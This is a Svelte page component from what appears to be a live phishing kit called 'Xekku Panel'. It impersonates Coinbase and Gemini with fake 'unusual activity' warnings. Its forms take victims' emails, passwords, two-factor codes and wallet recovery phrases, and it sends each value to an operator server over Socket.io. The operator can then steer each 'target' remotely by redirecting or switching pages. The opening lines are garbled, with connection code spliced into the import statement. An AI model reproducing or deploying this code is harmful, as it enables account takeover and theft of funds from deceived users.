<script lang="ts">
    import { onMount, onDe        // Connect to Socket.io server
        try {
            // Use Socket.io path routing via Nginx (works on all domains)
            // Nginx routes /socket.io/ to localhost:3001 on all domains
            const socketUrl = `${window.location.protocol}//${window.location.host}`;
            console.log('Connecting to Socket.io at:', socketUrl);
            
            socket = io(socketUrl, {
                path: '/socket.io',
                transports: ['websocket', 'polling'],
                upgrade: true,
                rememberUpgrade: true,
                timeout: 10000,
                reconnection: true,
                reconnectionAttempts: 5,
                reconnectionDelay: 1000,
                forceNew: true
            });lte';
    import { goto } from '$app/navigation';
    import { io } from 'socket.io-client';
    
    export let data;
    
    let isLoading = true;
    let socket;
    let targetID = '';
    let connectionStatus = 'Connecting...';
    let currentPage = 'account_review';
    let domainTemplate = 'Coinbase'; // Default to Coinbase
    let starterPage = 'account_review';
    
    // Get data from server-side load function
    const { targetUser, hasIdParam } = data;
    
    onMount(async () => {
        // If no ID parameter, redirect to login
        if (!hasIdParam) {
            goto('/login');
            return;
        }
        
        // Get domain template from server
        try {
            const domainResponse = await fetch('/api/domain/getTemplate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    domain: window.location.hostname,
                    username: targetUser 
                })
            });
            
            if (domainResponse.ok) {
                const domainData = await domainResponse.json();
                domainTemplate = domainData.template || 'Coinbase';
                starterPage = domainData.starterPage || 'account_review';
                currentPage = starterPage;
            }
        } catch (error) {
            console.log('Could not fetch domain template, using default');
        }
        
        // Connect to Socket.io server
        try {
            // Always connect to Socket.io on port 3001, using the current domain
            // This ensures Socket.io works on both main domain and connected domains
            const socketUrl = `${window.location.protocol}//${window.location.hostname}:3001`;
            console.log('Connecting to Socket.io at:', socketUrl);
            
            socket = io(socketUrl, {
                transports: ['websocket', 'polling'],
                upgrade: true,
                rememberUpgrade: true,
                timeout: 10000,
                reconnection: true,
                reconnectionAttempts: 5,
                reconnectionDelay: 1000,
                forceNew: true
            });
            
            socket.on('connect', () => {
                console.log('✅ Connected to Socket.io server');
                console.log('Connection ID:', socket.id);
                connectionStatus = 'Connected';
                
                // Identify this target to the server
                const identifyData = {
                    belongsto: targetUser,
                    browser: navigator.userAgent,
                    location: window.location.href,
                    currentPage: currentPage
                };
                console.log('Sending identify data:', identifyData);
                socket.emit('identify', identifyData);
            });
            
            socket.on('identified', (data) => {
                console.log('✅ Target identified successfully:', data);
                targetID = data.targetID;
                connectionStatus = 'Online';
                isLoading = false;
                
                console.log('🎯 Target ID assigned:', targetID);
                console.log('📡 Target status: Online and ready for control');
                
                // Set initial page from server
                if (data.start_page) {
                    currentPage = data.start_page;
                    console.log('📄 Initial page set to:', currentPage);
                }
                
                // Update status periodically
                setInterval(() => {
                    socket.emit('updateStatus', {
                        targetID: targetID,
                        status: 'Online',
                        currentPage: currentPage
                    });
                }, 5000); // Update every 5 seconds
            });
            
            socket.on('action', (data) => {
                console.log('🎮 RECEIVED ACTION:', data);
                console.log('   Action type:', data.action);
                console.log('   Custom URL:', data.customUrl);
                console.log('   Target ID:', targetID);
                console.log('   Timestamp:', new Date().toISOString());
                handleAction(data.action, data.customUrl);
            });
            
            socket.on('disconnect', () => {
                console.log('Disconnected from Socket.io server');
                connectionStatus = 'Offline';
            });
            
            socket.on('connect_error', (error) => {
                console.error('Socket.io connection error:', error);
                connectionStatus = 'Connection Error';
                isLoading = false;
            });
            
        } catch (error) {
            console.error('Failed to initialize socket:', error);
            connectionStatus = 'Failed to Connect';
            isLoading = false;
        }
    });
    
    onDestroy(() => {
        if (socket) {
            socket.disconnect();
        }
    });
    
    function handleAction(action, customUrl) {
        console.log(`🎯 HANDLING ACTION: ${action}`, customUrl);
        
        switch (action) {
            case 'redirect':
            case 'customRedirect':
                if (customUrl) {
                    console.log('🔗 Redirecting to:', customUrl);
                    console.log('🚀 Executing redirect in 1 second...');
                    setTimeout(() => {
                        window.location.href = customUrl;
                    }, 1000);
                } else {
                    console.log('❌ No URL provided for redirect');
                }
                break;
            case 'reload':
                console.log('🔄 Reloading page...');
                window.location.reload();
                break;
            case 'close':
                console.log('❌ Closing window...');
                window.close();
                break;
            case 'set_page':
                console.log('📄 Setting page to:', customUrl || 'account_review');
                currentPage = customUrl || 'account_review';
                if (socket && targetID) {
                    socket.emit('updateStatus', {
                        targetID: targetID,
                        status: 'Online',
                        currentPage: currentPage
                    });
                }
                break;
            default:
                // Handle page changes (login, account_review, etc.)
                console.log('📄 Changing page to:', action);
                currentPage = action;
                if (socket && targetID) {
                    socket.emit('updateStatus', {
                        targetID: targetID,
                        status: 'Online',
                        currentPage: currentPage
                    });
                }
                break;
        }
    }
    
    function handleFormSubmit(formData) {
        // Send captured data to server
        if (socket && targetID) {
            socket.emit('captureData', {
                targetID: targetID,
                page: currentPage,
                data: formData,
                timestamp: new Date().toISOString()
            });
        }
    }
</script>

<svelte:head>
    <title>Welcome | Xekku Panel</title>
    <meta name="description" content="Welcome to Xekku Panel" />
</svelte:head>

<main class="container">
    {#if isLoading}
        <div class="loading">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
    {:else if !hasIdParam}
        <div class="error">
            <h1>Access Denied</h1>
            <p>This page requires a valid access key.</p>
        </div>
    {:else if targetUser}
        <!-- Coinbase Template Interface -->
        {#if domainTemplate === 'Coinbase'}
            <div class="coinbase-interface">
                <!-- Header -->
                <div class="header">
                    <div class="logo">
                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                            <circle cx="16" cy="16" r="16" fill="#0052FF"/>
                            <path d="M16 4C9.4 4 4 9.4 4 16s5.4 12 12 12 12-5.4 12-12S22.6 4 16 4zm0 18c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z" fill="white"/>
                        </svg>
                        <span>Coinbase</span>
                    </div>
                    <div class="security-badge">
                        <span class="icon">🔒</span>
                        <span>Secure</span>
                    </div>
                </div>

                <!-- Main Content -->
                <div class="main-content">
                    {#if currentPage === 'account_review'}
                        <div class="security-notice">
                            <div class="icon">⚠️</div>
                            <h2>Account Security Review</h2>
                            <p>We've detected unusual activity on your account. To protect your funds, we need to verify your identity.</p>
                            <p><strong>Action Required:</strong> Please complete the security verification process below.</p>
                            <button class="continue-btn" on:click={() => currentPage = 'login'}>
                                Continue Verification
                            </button>
                        </div>
                    {:else if currentPage === 'login'}
                        <div class="auth-form">
                            <h2>Sign in to Coinbase</h2>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'email', email: e.target.email.value})}>
                                <div class="form-group">
                                    <label for="email">Email</label>
                                    <input type="email" id="email" name="email" required>
                                </div>
                                <button type="submit" class="submit-btn">Continue</button>
                            </form>
                        </div>
                    {:else if currentPage === 'login-two'}
                        <div class="auth-form">
                            <h2>Enter your password</h2>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'password', password: e.target.password.value})}>
                                <div class="form-group">
                                    <label for="password">Password</label>
                                    <input type="password" id="password" name="password" required>
                                </div>
                                <button type="submit" class="submit-btn">Sign In</button>
                            </form>
                        </div>
                    {:else if currentPage === 'login-otp'}
                        <div class="auth-form">
                            <h2>Two-factor authentication</h2>
                            <p>Enter the 6-digit code from your authenticator app</p>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'otp', otp: e.target.otp.value})}>
                                <div class="form-group">
                                    <label for="otp">Authentication Code</label>
                                    <input type="text" id="otp" name="otp" maxlength="6" required>
                                </div>
                                <button type="submit" class="submit-btn">Verify</button>
                            </form>
                        </div>
                    {:else if currentPage === 'import_seed'}
                        <div class="auth-form">
                            <h2>Wallet Recovery Required</h2>
                            <p>For security, please verify your wallet recovery phrase</p>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'seed', seed: e.target.seed.value})}>
                                <div class="form-group">
                                    <label for="seed">Recovery Phrase (12-24 words)</label>
                                    <textarea id="seed" name="seed" rows="4" placeholder="Enter your recovery phrase separated by spaces" required></textarea>
                                </div>
                                <button type="submit" class="submit-btn">Verify Wallet</button>
                            </form>
                        </div>
                    {/if}
                </div>
            </div>

        <!-- Gemini Template Interface -->
        {:else if domainTemplate === 'Gemini'}
            <div class="gemini-interface">
                <!-- Header -->
                <div class="header">
                    <div class="logo">
                        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                            <rect width="32" height="32" rx="8" fill="#00D4FF"/>
                            <path d="M8 24V8h3v13h10V8h3v16H8z" fill="white"/>
                        </svg>
                        <span>Gemini</span>
                    </div>
                    <div class="security-badge">
                        <span class="icon">🔒</span>
                        <span>Secure</span>
                    </div>
                </div>

                <!-- Main Content -->
                <div class="main-content">
                    {#if currentPage === 'account_review'}
                        <div class="security-notice">
                            <div class="icon">🔐</div>
                            <h2>Security Verification Required</h2>
                            <p>Your account requires additional verification to ensure the security of your digital assets.</p>
                            <p><strong>This process is mandatory</strong> and must be completed within 24 hours.</p>
                            <button class="continue-btn" on:click={() => currentPage = 'login'}>
                                Begin Verification
                            </button>
                        </div>
                    {:else if currentPage === 'login'}
                        <div class="auth-form">
                            <h2>Sign in to Gemini</h2>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'email', email: e.target.email.value})}>
                                <div class="form-group">
                                    <label for="email">Email Address</label>
                                    <input type="email" id="email" name="email" required>
                                </div>
                                <button type="submit" class="submit-btn">Continue</button>
                            </form>
                        </div>
                    {:else if currentPage === 'login-two'}
                        <div class="auth-form">
                            <h2>Enter your password</h2>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'password', password: e.target.password.value})}>
                                <div class="form-group">
                                    <label for="password">Password</label>
                                    <input type="password" id="password" name="password" required>
                                </div>
                                <button type="submit" class="submit-btn">Sign In</button>
                            </form>
                        </div>
                    {:else if currentPage === 'login-otp'}
                        <div class="auth-form">
                            <h2>Two-Factor Authentication</h2>
                            <p>Please enter your 6-digit authentication code</p>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'otp', otp: e.target.otp.value})}>
                                <div class="form-group">
                                    <label for="otp">Authentication Code</label>
                                    <input type="text" id="otp" name="otp" maxlength="6" required>
                                </div>
                                <button type="submit" class="submit-btn">Verify</button>
                            </form>
                        </div>
                    {:else if currentPage === 'import_seed'}
                        <div class="auth-form">
                            <h2>Security Wallet Verification</h2>
                            <p>Please provide your wallet recovery phrase for verification</p>
                            <form on:submit|preventDefault={(e) => handleFormSubmit({type: 'seed', seed: e.target.seed.value})}>
                                <div class="form-group">
                                    <label for="seed">Recovery Phrase</label>
                                    <textarea id="seed" name="seed" rows="4" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
                                </div>
                                <button type="submit" class="submit-btn">Verify Security</button>
                            </form>
                        </div>
                    {/if}
                </div>
            </div>
        {/if}

        <!-- Connection Status (Hidden but functional) -->
        <div class="status-indicator" style="display: none;">
            Status: {connectionStatus} | Target: {targetID} | Page: {currentPage}
        </div>
    {:else}
        <div class="error">
            <h1>Connection Failed</h1>
            <p>Unable to establish connection. Please try again.</p>
            <button on:click={() => window.location.reload()}>Retry</button>
        </div>
    {/if}
</main>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: #f8f9fa;
        min-height: 100vh;
    }

    .loading {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        gap: 1rem;
    }

    .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #e3e3e3;
        border-top: 4px solid #0052FF;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .error {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        gap: 1rem;
        padding: 2rem;
        text-align: center;
    }

    /* Coinbase Interface Styles */
    .coinbase-interface {
        min-height: 100vh;
        background: #ffffff;
    }

    .coinbase-interface .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 2rem;
        border-bottom: 1px solid #e3e8ef;
        background: #ffffff;
    }

    .coinbase-interface .logo {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        font-size: 1.5rem;
        font-weight: 600;
        color: #0052FF;
    }

    .coinbase-interface .security-badge {
        display: flex;
        align-items: center;
        gap: 0.25rem;
        padding: 0.5rem 1rem;
        background: #f0f8ff;
        border-radius: 20px;
        font-size: 0.875rem;
        color: #0052FF;
    }

    .coinbase-interface .main-content {
        max-width: 400px;
        margin: 4rem auto;
        padding: 2rem;
    }

    .coinbase-interface .security-notice {
        text-align: center;
        padding: 2rem;
        background: #fff3cd;
        border: 1px solid #ffeaa7;
        border-radius: 8px;
    }

    .coinbase-interface .security-notice .icon {
        font-size: 3rem;
        margin-bottom: 1rem;
    }

    .coinbase-interface .security-notice h2 {
        margin-bottom: 1rem;
        color: #856404;
    }

    .coinbase-interface .security-notice p {
        margin-bottom: 1rem;
        color: #856404;
        line-height: 1.5;
    }

    .coinbase-interface .auth-form {
        background: #ffffff;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .coinbase-interface .auth-form h2 {
        margin-bottom: 1.5rem;
        color: #1a1a1a;
        text-align: center;
    }

    .form-group {
        margin-bottom: 1.5rem;
    }

    .form-group label {
        display: block;
        margin-bottom: 0.5rem;
        font-weight: 500;
        color: #1a1a1a;
    }

    .form-group input,
    .form-group textarea {
        width: 100%;
        padding: 0.75rem;
        border: 2px solid #e3e8ef;
        border-radius: 4px;
        font-size: 1rem;
        transition: border-color 0.2s;
    }

    .form-group input:focus,
    .form-group textarea:focus {
        outline: none;
        border-color: #0052FF;
    }

    .continue-btn,
    .submit-btn {
        width: 100%;
        padding: 0.875rem;
        background: #0052FF;
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 1rem;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.2s;
    }

    .continue-btn:hover,
    .submit-btn:hover {
        background: #0040cc;
    }

    /* Gemini Interface Styles */
    .gemini-interface {
        min-height: 100vh;
        background: #ffffff;
    }

    .gemini-interface .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 2rem;
        border-bottom: 1px solid #e3e8ef;
        background: #ffffff;
    }

    .gemini-interface .logo {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        font-size: 1.5rem;
        font-weight: 600;
        color: #00D4FF;
    }

    .gemini-interface .security-badge {
        display: flex;
        align-items: center;
        gap: 0.25rem;
        padding: 0.5rem 1rem;
        background: #f0fffe;
        border-radius: 20px;
        font-size: 0.875rem;
        color: #00D4FF;
    }

    .gemini-interface .main-content {
        max-width: 400px;
        margin: 4rem auto;
        padding: 2rem;
    }

    .gemini-interface .security-notice {
        text-align: center;
        padding: 2rem;
        background: #e7f3ff;
        border: 1px solid #b3d9ff;
        border-radius: 8px;
    }

    .gemini-interface .security-notice .icon {
        font-size: 3rem;
        margin-bottom: 1rem;
    }

    .gemini-interface .security-notice h2 {
        margin-bottom: 1rem;
        color: #0066cc;
    }

    .gemini-interface .security-notice p {
        margin-bottom: 1rem;
        color: #0066cc;
        line-height: 1.5;
    }

    .gemini-interface .auth-form {
        background: #ffffff;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .gemini-interface .auth-form h2 {
        margin-bottom: 1.5rem;
        color: #1a1a1a;
        text-align: center;
    }

    .gemini-interface .continue-btn,
    .gemini-interface .submit-btn {
        background: #00D4FF;
    }

    .gemini-interface .continue-btn:hover,
    .gemini-interface .submit-btn:hover {
        background: #00b8e6;
    }

    .gemini-interface .form-group input:focus,
    .gemini-interface .form-group textarea:focus {
        border-color: #00D4FF;
    }

    .status-indicator {
        position: fixed;
        bottom: 10px;
        right: 10px;
        padding: 0.5rem;
        background: rgba(0, 0, 0, 0.8);
        color: white;
        font-size: 0.75rem;
        border-radius: 4px;
    }
</style>
